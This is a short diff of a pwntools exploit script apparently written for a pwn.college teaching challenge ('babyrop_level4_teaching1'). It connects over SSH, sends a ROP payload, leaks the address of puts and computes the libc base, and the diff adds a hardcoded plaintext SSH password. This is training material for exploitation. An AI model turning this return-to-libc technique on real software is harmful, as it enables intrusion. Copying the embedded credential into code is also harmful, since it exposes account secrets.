@@ -1,8 +1,8 @@
 from pwn import *
 
 e = ELF('./babyrop_level4_teaching1')
-libc = ELF('../libc6_2.31-0ubuntu9.2_amd64.so')
-s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",keyfile='../../key',port=22)
+libc = ELF('../../libc6_2.31-0ubuntu9.2_amd64.so')
+s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",keyfile='../../csec',port=22,password='djaxod12')
 
 p = s.run('/babyrop_level4_teaching1')
 
@@ -24,6 +24,7 @@ p.sendafter(b'\n\n',pay)
 
 p.recvuntil(b'Exiting!\n')
 puts = u64(p.recvline().strip() + b'\x00\x00')
+print(hex(puts))
 base = puts - libc.symbols['puts']
 libc.address = base
 
